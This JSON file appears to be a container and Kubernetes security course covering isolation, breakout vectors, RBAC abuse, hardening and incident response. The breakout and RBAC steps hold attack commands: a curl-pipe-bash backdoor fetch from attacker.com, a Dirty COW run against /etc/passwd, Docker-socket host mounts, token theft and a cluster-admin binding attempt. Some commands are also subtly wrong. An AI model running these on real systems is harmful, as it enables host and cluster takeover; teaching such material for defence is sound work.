{
  "id": "container-security-tutorial",
  "title": "Container & Kubernetes Security",
  "description": "Comprehensive container and Kubernetes security tutorials covering container isolation, breakout vectors, RBAC abuse, runtime hardening, and incident response procedures.",
  "type": "tutorial",
  "steps": [
    {
      "id": "container-isolation-fundamentals",
      "title": "Container Isolation Fundamentals",
      "content": "OBJECTIVE: Understand container isolation mechanisms and identify potential security boundaries.\n\nACADEMIC BACKGROUND:\nContainer security relies on Linux kernel namespaces and cgroups to create isolated environments. According to MITRE ATT&CK, container isolation mechanisms can be bypassed through various techniques, making understanding these boundaries critical for security.\n\nKey Isolation Mechanisms:\n- PID namespace: Process isolation (each container has its own process tree)\n- Network namespace: Network stack isolation (separate network interfaces and routing)\n- Mount namespace: Filesystem isolation (separate view of the filesystem hierarchy)\n- User namespace: User/group ID isolation (different UID/GID mappings)\n- UTS namespace: Hostname and domain isolation\n- IPC namespace: Inter-process communication isolation\n\nSTEP-BY-STEP:\n\n1. EXAMINE NAMESPACE ISOLATION:\n   \n   a) Check PID namespace isolation:\n   ```bash\n   # Run container and examine process tree\n   docker run --rm -it alpine ps aux\n   # Compare with host processes\n   ps aux | head -10\n   ```\n   \n   b) Test network namespace separation:\n   ```bash\n   # Check container network interfaces\n   docker run --rm -it alpine ip link show\n   # Check host network interfaces\n   ip link show\n   ```\n   \n   c) Verify mount namespace isolation:\n   ```bash\n   # Examine container filesystem\n   docker run --rm -it alpine ls -la /\n   # Check if host paths are visible\n   docker run --rm -it alpine ls -la /host 2>/dev/null || echo 'Host not accessible'\n   ```\n\n2. ANALYZE CAPABILITY RESTRICTIONS:\n   \n   a) Check container capabilities:\n   ```bash\n   # Examine default capabilities\n   docker run --rm -it alpine capsh --print\n   \n   # Compare with host capabilities\n   capsh --print\n   ```\n   \n   b) Test capability restrictions:\n   ```bash\n   # Try to perform privileged operations\n   docker run --rm -it alpine mount --help\n   docker run --rm -it --privileged alpine mount --help\n   ```\n\n3. INVESTIGATE SECURITY PROFILES:\n   \n   a) Check AppArmor/SELinux status:\n   ```bash\n   # Check AppArmor status\n   docker run --rm -it alpine cat /proc/self/attr/current 2>/dev/null || echo 'No AppArmor'\n   \n   # Check SELinux context\n   docker run --rm -it alpine cat /proc/self/attr/current 2>/dev/null || echo 'No SELinux'\n   ```\n\nWHAT TO LOOK FOR:\n- Container processes visible from host: `ps aux | grep -E '(docker|containerd|runc)'`\n- Excessive capabilities: `docker inspect <container> | grep Cap`\n- Weak security profiles: `docker inspect <container> | grep -E '(AppArmor|Selinux)'`\n- Host filesystem access: `docker exec <container> ls -la /host`\n\nCOMMON PITFALLS:\n- Use minimal base images and remove unnecessary tools\n- Drop all non-essential capabilities using --cap-drop\n- Apply AppArmor/SELinux profiles consistently\n- Avoid privileged containers unless absolutely necessary\n- Implement read-only root filesystems where possible\n- Use user namespaces for UID mapping\n\nTOOLS AND RESOURCES:\n- Docker Bench for Security: Automated security checks\n- Lynis: Security auditing tool\n- OpenSCAP: Security compliance scanning\n- Container Escape Tools: For testing isolation (authorized use only)\n\nREFERENCES:\n- Docker Security Documentation: https://docs.docker.com/engine/security/\n- Linux Namespaces: https://man7.org/linux/man-pages/man7/namespaces.7.html\n- MITRE ATT&CK Container Techniques: https://attack.mitre.org/matrices/enterprise/containers/",
      "tags": [
        "container",
        "isolation",
        "security"
      ],
      "related_tools": [
        "docker",
        "unix-privesc-check",
        "linux-smart-enumeration",
        "linux-exploit-suggester",
        "ml-pipeline-audit"
      ]
    },
    {
      "id": "container-breakout-vectors",
      "title": "Container Breakout Vectors",
      "content": "OBJECTIVE: Identify and exploit common container breakout vectors for security assessment.\n\nACADEMIC BACKGROUND:\nContainer breakout occurs when an attacker escapes the container's isolation mechanisms and gains access to the host system. According to research, common breakout vectors include CAP_SYS_ADMIN capability, Docker socket mounting, host filesystem mounts, kernel vulnerabilities, and runtime vulnerabilities.\n\nCommon Breakout Vectors:\n- CAP_SYS_ADMIN capability: Full administrative privileges\n- Docker socket mounting: Control over container daemon\n- Host filesystem mounts: Direct host file access\n- Kernel vulnerabilities: Memory corruption and privilege escalation\n- Runtime vulnerabilities: Container daemon exploitation\n\nSTEP-BY-STEP:\n\n1. PRIVILEGED CONTAINER ESCAPES:\n   \n   a) Deploy privileged container:\n   ```bash\n   # Run privileged container\n   docker run --privileged -it --name breakout-test ubuntu bash\n   \n   # Inside container - mount host filesystem\n   mount /dev/sda1 /mnt/host\n   ls -la /mnt/host\n   ```\n   \n   b) Access host processes:\n   ```bash\n   # View host processes\n   ps aux | head -10\n   cat /proc/1/cgroup\n   ```\n   \n   c) Modify host system:\n   ```bash\n   # Modify host iptables\n   iptables -L\n   # Install backdoors\n   curl http://attacker.com/backdoor.sh | bash\n   ```\n\n2. DOCKER SOCKET EXPLOITATION:\n   \n   a) Mount Docker socket:\n   ```bash\n   # Run container with Docker socket\n   docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker bash\n   \n   # Use Docker API from container\n   docker ps\n   docker images\n   ```\n   \n   b) Create privileged containers:\n   ```bash\n   # Create privileged sibling container\n   docker run --privileged -d -v /:/host --name host-access ubuntu tail -f /dev/null\n   \n   # Access host filesystem\n   docker exec host-access ls -la /host\n   ```\n\n3. KERNEL VULNERABILITY CHAINS:\n   \n   a) Identify kernel version:\n   ```bash\n   # Check kernel version\n   uname -a\n   cat /proc/version\n   \n   # Search for known CVEs\n   searchsploit linux kernel 4.15\n   ```\n   \n   b) Test Dirty COW (CVE-2016-5195):\n   ```bash\n   # Compile Dirty COW exploit (if vulnerable)\n   gcc -pthread dirtyc0w.c -o dirtyc0w\n   ./dirtyc0w /etc/passwd root:x:0:0:root:/root:/bin/bash\n   ```\n\n4. RUNTIME VULNERABILITIES:\n   \n   a) Test runc vulnerability (CVE-2019-5736):\n   ```bash\n   # Check runc version\n   runc --version\n   \n   # Test for vulnerability (if vulnerable version)\n   # Exploit code would replace host runc binary\n   ```\n\nWHAT TO LOOK FOR:\n- Privileged containers: `docker ps --filter 'privileged=true'`\n- Docker socket mounts: `docker ps --filter 'volume=/var/run/docker.sock'`\n- Host path volumes: `docker inspect <container> | grep hostPath`\n- Capable containers: `docker inspect <container> | grep -A 10 'Capabilities'`\n- Suspicious container behavior: Unusual process activity\n\nCOMMON PITFALLS:\n- Never use --privileged flag in production\n- Avoid mounting Docker socket or other critical host paths\n- Keep kernel and container runtime updated\n- Implement seccomp profiles to restrict system calls\n- Use AppArmor/SELinux profiles for additional confinement\n- Regular security scanning and monitoring\n\nTOOLS AND RESOURCES:\n- CDK (Container Penetration Toolkit): Comprehensive container security toolkit\n- DeepCE: Docker enumeration and exploitation tool\n- Container Escape Scripts: For authorized testing\n- LinPEAS: Linux privilege escalation enumeration\n\nREFERENCES:\n- Container Escape Techniques: https://blog.dragonsector.pl/2019/02/28/docker-container-escape/\n- runc Vulnerability CVE-2019-5736: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736\n- Dirty COW Exploit: https://github.com/dirtycow/dirtycow.github.io",
      "tags": [
        "container",
        "breakout",
        "security"
      ],
      "related_tools": [
        "docker",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "linux-smart-enumeration",
        "unix-privesc-check"
      ]
    },
    {
      "id": "kubernetes-rbac-abuse",
      "title": "Kubernetes RBAC Abuse",
      "content": "OBJECTIVE: Identify and exploit RBAC misconfigurations for unauthorized cluster access.\n\nACADEMIC BACKGROUND:\nKubernetes Role-Based Access Control (RBAC) governs API access authorization. RBAC misconfigurations are among the most common security issues in Kubernetes environments, often leading to privilege escalation and cluster compromise.\n\nRBAC Components:\n- Roles: Define permissions within a namespace\n- ClusterRoles: Define permissions cluster-wide\n- RoleBindings: Bind roles to users/groups/service accounts\n- ClusterRoleBindings: Bind cluster roles cluster-wide\n\nCommon RBAC Misconfigurations:\n- Over-permissive wildcard permissions (*)\n- Cluster-admin bindings to service accounts\n- Role escalation paths\n- Excessive service account permissions\n\nSTEP-BY-STEP PROCESS:\n\n1. ENUMERATE RBAC PERMISSIONS:\n   \n   a) Check current permissions:\n   ```bash\n   # Check what you can do\n   kubectl auth can-i --list\n   \n   # Check service account permissions\n   kubectl auth can-i --as=system:serviceaccount:default:default --list\n   \n   # Enumerate cluster roles\n   kubectl get clusterroles -o wide\n   kubectl describe clusterrole <role-name>\n   ```\n   \n   b) Examine role bindings:\n   ```bash\n   # List cluster role bindings\n   kubectl get clusterrolebindings\n   \n   # Check for dangerous bindings\n   kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\")'\n   \n   # Find service accounts with elevated permissions\n   kubectl get clusterrolebindings -o json | jq '.items[] | {name: .metadata.name, subjects: .subjects}'\n   ```\n\n2. SERVICE ACCOUNT EXPLOITATION:\n   \n   a) Locate service account tokens:\n   ```bash\n   # Inside a pod - find service account token\n   cat /var/run/secrets/kubernetes.io/serviceaccount/token\n   cat /var/run/secrets/kubernetes.io/serviceaccount/namespace\n   \n   # Test token permissions\n   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n   curl -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/pods\n   ```\n   \n   b) Enumerate with service account:\n   ```bash\n   # Use kubectl with service account\n   kubectl --token=$TOKEN --namespace=default get pods\n   \n   # Try to escalate privileges\n   kubectl --token=$TOKEN create clusterrolebinding temp-admin --clusterrole=cluster-admin --serviceaccount=default:default\n   ```\n\n3. PRIVILEGE ESCALATION TECHNIQUES:\n   \n   a) Create privileged pods:\n   ```yaml\n   # privileged-pod.yaml\n   apiVersion: v1\n   kind: Pod\n   metadata:\n     name: privileged-pod\n   spec:\n     containers:\n     - name: attack-container\n       image: ubuntu\n       securityContext:\n         privileged: true\n       command: [\"sleep\", \"3600\"]\n   ```\n   \n   b) Mount host filesystem access:\n   ```yaml\n   # host-mount-pod.yaml\n   apiVersion: v1\n   kind: Pod\n   metadata:\n     name: host-mount\n   spec:\n     containers:\n     - name: host-access\n       image: ubuntu\n       volumeMounts:\n       - name: host-root\n         mountPath: /host\n     volumes:\n     - name: host-root\n         hostPath:\n           path: /\n   ```\n\n4. WILDCARD PERMISSION ABUSE:\n   \n   a) Test wildcard permissions:\n   ```bash\n   # Check for wildcard permissions\n   kubectl get clusterrole -o yaml | grep -A 5 '\"*\"'\n   \n   # Create resources if allowed\n   kubectl create deployment test-deployment --image=nginx\n   kubectl expose deployment test-deployment --port=80\n   ```\n\nWHAT TO LOOK FOR:\n- Over-permissive roles: `kubectl get clusterroles -o json | jq '.items[].rules[] | select(.resources==[\"*\"])'`\n- Cluster-admin bindings: `kubectl get clusterrolebindings | grep cluster-admin`\n- Wildcard verbs: `kubectl get roles -o json | jq '.items[].rules[] | select(.verbs==[\"*\"])'`\n- Service account tokens in pods: `kubectl exec <pod> -- ls /var/run/secrets/kubernetes.io/serviceaccount/`\n\nTOOLS AND RESOURCES:\n- Pebble: Kubernetes privilege escalation checker\n- kubectl-auth-can-i: Permission testing tool\n- kube-hunter: Kubernetes penetration testing tool\n- Kubesec: Kubernetes security analysis tool\n\nCOMMON PITFALLS:\n- Apply principle of least privilege to all roles and bindings\n- Avoid wildcard permissions unless absolutely necessary\n- Regularly audit role bindings and service account permissions\n- Use RBAC authorization mode exclusively\n- Implement Pod Security Policies or Pod Security Admission\n- Separate namespaces for different applications/teams\n\nTOOLS AND RESOURCES:\n- Pebble: Kubernetes privilege escalation checker\n- kubectl-auth-can-i: Permission testing tool\n- kube-hunter: Kubernetes penetration testing tool\n- Kubesec: Kubernetes security analysis tool\n\nREFERENCES:\n- Kubernetes RBAC Documentation: https://kubernetes.io/docs/reference/access-authn-authz/rbac/\n- Kubernetes Security Hardening Guide: https://kubernetes.io/docs/concepts/security-cluster-hardening/\n- MITRE ATT&CK Kubernetes: https://attack.mitre.org/matrices/enterprise/kubernetes/",
      "tags": [
        "kubernetes",
        "rbac",
        "security"
      ],
      "related_tools": [
        "kube-hunter",
        "kube-bench",
        "kubectl",
        "unix-privesc-check",
        "ml-pipeline-audit"
      ]
    },
    {
      "id": "runtime-security-hardening",
      "title": "Runtime Security and Hardening",
      "content": "OBJECTIVE: Implement and validate runtime security controls for Kubernetes workloads.\n\nACADEMIC BACKGROUND:\nKubernetes runtime security focuses on protecting workloads during execution through security contexts, policies, and monitoring. Effective runtime hardening prevents common attack vectors including container escape, privilege escalation, and lateral movement.\n\nRuntime Security Components:\n- Security Contexts: Pod and container-level security settings\n- Pod Security Admission: Enforce security standards\n- Network Policies: Control pod-to-pod communication\n- Admission Controllers: Validate and mutate API requests\n- Runtime Monitoring: Detect anomalous behavior\n\nSTEP-BY-STEP PROCESS:\n\n1. IMPLEMENT SECURITY CONTEXTS:\n   \n   a) Pod-level security context:\n   ```yaml\n   # secure-pod.yaml\n   apiVersion: v1\n   kind: Pod\n   metadata:\n     name: secure-pod\n   spec:\n     securityContext:\n       runAsNonRoot: true\n       runAsUser: 1000\n       fsGroup: 2000\n     containers:\n     - name: app\n       image: nginx:1.21\n       securityContext:\n         allowPrivilegeEscalation: false\n         readOnlyRootFilesystem: true\n         capabilities:\n           drop:\n           - ALL\n           add:\n           - NET_BIND_SERVICE\n   ```\n   \n   b) Validate security context:\n   ```bash\n   # Check pod security context\n   kubectl get pod secure-pod -o yaml | grep -A 10 securityContext\n   \n   # Verify container security\n   kubectl exec secure-pod -- id\n   kubectl exec secure-pod -- cat /proc/self/status | grep CapEff\n   ```\n\n2. CONFIGURE POD SECURITY ADMISSION:\n   \n   a) Create security policy:\n   ```yaml\n   # pod-security-policy.yaml\n   apiVersion: policy/v1beta1\n   kind: PodSecurityPolicy\n   metadata:\n     name: restricted-psp\n   spec:\n     privileged: false\n     allowPrivilegeEscalation: false\n     requiredDropCapabilities:\n       - ALL\n     volumes:\n       - 'configMap'\n       - 'emptyDir'\n       - 'projected'\n       - 'secret'\n       - 'downwardAPI'\n       - 'persistentVolumeClaim'\n     runAsUser:\n       rule: 'MustRunAsNonRoot'\n     seLinux:\n       rule: 'RunAsAny'\n     fsGroup:\n       rule: 'RunAsAny'\n   ```\n   \n   b) Apply and test policy:\n   ```bash\n   # Apply policy\n   kubectl apply -f pod-security-policy.yaml\n   \n   # Test with privileged pod (should fail)\n   kubectl run privileged-test --image=nginx --privileged\n   ```\n\n3. IMPLEMENT NETWORK POLICIES:\n   \n   a) Default deny policy:\n   ```yaml\n   # default-deny.yaml\n   apiVersion: networking.k8s.io/v1\n   kind: NetworkPolicy\n   metadata:\n     name: default-deny\n   spec:\n     podSelector: {}\n     policyTypes:\n     - Ingress\n     - Egress\n   ```\n\nWHAT TO LOOK FOR:\n- Security context violations: `kubectl get events --field-selector reason=FailedScheduling`\n- Network policy violations: `kubectl logs -n kube-system -l k8s-app=calico-node`\n- Admission controller rejections: `kubectl get events --field-selector reason=FailedAdmission`\n- Runtime anomalies: Falco alerts, container escape attempts\n- Privilege escalation: Unusual service account usage\n\nCOMMON PITFALLS:\n- Enforce security contexts across all namespaces\n- Implement default deny network policies\n- Use admission controllers for policy enforcement\n- Deploy runtime monitoring and alerting\n- Regular security scanning and compliance checking\n- Implement incident response procedures\n\nTOOLS AND RESOURCES:\n- Falco: Runtime security monitoring\n- OPA/Gatekeeper: Policy as code enforcement\n- Calico: Network policy implementation\n- Trivy: Container image scanning\n- kube-bench: CIS benchmark checking\n\nREFERENCES:\n- Kubernetes Security Contexts: https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\n- Pod Security Admission: https://kubernetes.io/docs/concepts/security/pod-security-admission/\n- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes",
      "tags": [
        "kubernetes",
        "runtime",
        "security"
      ],
      "related_tools": [
        "kube-bench",
        "kube-hunter",
        "kubectl",
        "ml-pipeline-audit",
        "burp-api-scanner"
      ]
    },
    {
      "id": "incident-response-forensics",
      "title": "Incident Response and Forensics",
      "content": "OBJECTIVE: Develop incident response procedures for container and Kubernetes security incidents.\n\nACADEMIC BACKGROUND:\nContainer and Kubernetes environments require specialized incident response approaches due to their ephemeral and distributed nature. Effective response involves rapid detection, containment, evidence collection, and recovery while preserving forensic artifacts.\n\nIncident Response Lifecycle:\n1. Preparation: Tools, procedures, and monitoring\n2. Detection: Identify security incidents\n3. Containment: Isolate affected resources\n4. Investigation: Collect and analyze evidence\n5. Recovery: Restore secure operations\n6. Post-incident: Lessons learned and improvements\n\nContainer-Specific Challenges:\n- Ephemeral nature of containers\n- Distributed logging and monitoring\n- Rapid scaling and deployment\n- Shared kernel and resources\n- Complex supply chains\n\nSTEP-BY-STEP PROCESS:\n\n1. PREPARE MONITORING INFRASTRUCTURE:\n   \n   a) Deploy comprehensive logging:\n   ```yaml\n   # fluentd-config.yaml\n   apiVersion: v1\n   kind: ConfigMap\n   metadata:\n     name: fluentd-config\n   data:\n     fluent.conf: |\n       <source>\n         @type tail\n         path /var/log/containers/*.log\n         pos_file /var/log/fluentd-containers.log.pos\n         tag kubernetes.*\n         format json\n         time_key time\n         time_format %Y-%m-%dT%H:%M:%S.%NZ\n       </source>\n       \n       <match kubernetes.**>\n         @type elasticsearch\n         host elasticsearch.logging.svc.cluster.local\n         port 9200\n         index_name kubernetes-logs\n       </match>\n   ```\n   \n   b) Configure audit logging:\n   ```yaml\n   # audit-policy.yaml\n   apiVersion: audit.k8s.io/v1\n   kind: Policy\n   rules:\n   - level: Metadata\n     namespaces: [\"default\", \"kube-system\"]\n   - level: Request\n     resources: [\"pods\", \"services\", \"secrets\"]\n   - level: RequestResponse\n     resources: [\"deployments\", \"replicasets\"]\n   ```\n\n2. ESTABLISH DETECTION RULES:\n   \n   a) Falco rules for container security:\n   ```yaml\n   # falco-container-rules.yaml\n   - rule: Detect privileged container usage\n     desc: Detect creation of privileged containers\n     condition: >\n       kubectl.create.container and\n       (container.privileged = true or\n        container.host_pid = true or\n        container.host_network = true)\n     output: >\n       Privileged container created (user=%user.name container=%container.name \n       image=%container.image)\n     priority: WARNING\n     tags: [kubernetes, privileged]\n   ```\n\n3. ESTABLISH CONTAINMENT PROCEDURES:\n   \n   a) Network isolation:\n   ```bash\n   # Isolate compromised namespace\n   kubectl create networkpolicy isolate-compromised --namespace=compromised \\\n     --selector=app=compromised --pod-selector=\"\" \\\n     --policy-types=Ingress,Egress\n   \n   # Quarantine specific pod\n   kubectl label pod compromised-pod quarantine=true \n     --overwrite\n   kubectl patch deployment compromised-deployment -p '{\"spec\":{\"replicas\":0}}'\n   ```\n   \n   b) Scale down affected deployments:\n   ```bash\n   # Immediately scale to zero\n   kubectl scale deployment compromised-app --replicas=0\n   \n   # Create forensic copy\n   kubectl get deployment compromised-app -o yaml > forensic-deployment.yaml\n   ```\n\n4. FORENSIC EVIDENCE COLLECTION:\n   \n   a) Container forensics:\n   ```bash\n   # Create forensic copy of container\n   docker export compromised-container > forensic-container.tar\n   \n   # Extract container filesystem\n   mkdir forensic-analysis\n   tar -xf forensic-container.tar -C forensic-analysis/\n   \n   # Analyze container filesystem\n   find forensic-analysis/ -type f -exec grep -l \"malware\" {} \\;\n   ```\n   \n   b) Kubernetes API audit logs:\n   ```bash\n   # Extract audit logs for time window\n   grep \"2024-01-15T10:00:00\" /var/log/kubernetes/audit.log | \\\n     grep \"compromised-service-account\" > api-audit.log\n   \n   # Analyze API calls\n   jq '.user.username' api-audit.log | sort | uniq -c\n   ```\n\n5. RECOVERY AND HARDENING:\n   \n   a) Rebuild with security hardening:\n   ```yaml\n   # hardened-deployment.yaml\n   apiVersion: apps/v1\n   kind: Deployment\n   metadata:\n     name: hardened-app\n   spec:\n     template:\n       spec:\n         securityContext:\n           runAsNonRoot: true\n           fsGroup: 2000\n         containers:\n         - name: app\n           image: app:v2-hardened\n           securityContext:\n             allowPrivilegeEscalation: false\n             readOnlyRootFilesystem: true\n           resources:\n             requests:\n               memory: \"256Mi\"\n               cpu: \"250m\"\n             limits:\n               memory: \"512Mi\"\n               cpu: \"500m\"\n   ```\n   \n   b) Implement security controls:\n   ```bash\n   # Apply network policies\n   kubectl apply -f security-network-policies.yaml\n   \n   # Enable Pod Security Admission\n   kubectl label namespace secure-app pod-security.kubernetes.io/enforce=restricted\n   \n   # Deploy security monitoring\n   kubectl apply -f falco-daemonset.yaml\n   ```\n\nDETECTION:\n- Security events: Falco alerts, audit log anomalies\n- Resource abuse: Unusual CPU/memory usage patterns\n- Network activity: Suspicious connections, data exfiltration\n- API access: Unauthorized requests, privilege escalation attempts\n- Container behavior: Escape attempts, unusual process activity\n\nREMEDIATION:\n- Immediate isolation and containment\n- Forensic evidence preservation\n- Security control implementation\n- System hardening and patching\n- Monitoring and alerting enhancement\n- Incident documentation and review\n\nTOOLS AND RESOURCES:\n- Falco: Runtime security monitoring and alerting\n- OPA/Gatekeeper: Policy enforcement and compliance\n- Velero: Backup and disaster recovery\n- Trivy: Container and Kubernetes vulnerability scanning\n- kube-hunter: Security assessment and penetration testing\n\nREFERENCES:\n- Kubernetes Incident Response Guide: https://kubernetes.io/docs/tasks/debug-application-cluster/debug-cluster/\n- NIST Incident Response Framework: https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final\n- Container Forensics: https://sans.org/blog/container-forensics/",
      "tags": [
        "kubernetes",
        "incident",
        "response"
      ],
      "related_tools": [
        "kube-hunter",
        "kube-bench",
        "ml-pipeline-audit",
        "eslint-security",
        "burp-api-scanner"
      ]
    },
    {
      "id": "container-security-quiz",
      "title": "Container & Kubernetes Security Quiz",
      "content": "Quiz content loaded from container_security/container-kubernetes-quiz.txt",
      "tags": [
        "quiz",
        "container",
        "kubernetes"
      ],
      "related_tools": [
        "kube-bench",
        "kube-hunter",
        "clair",
        "kubectl",
        "falco"
      ]
    }
  ]
}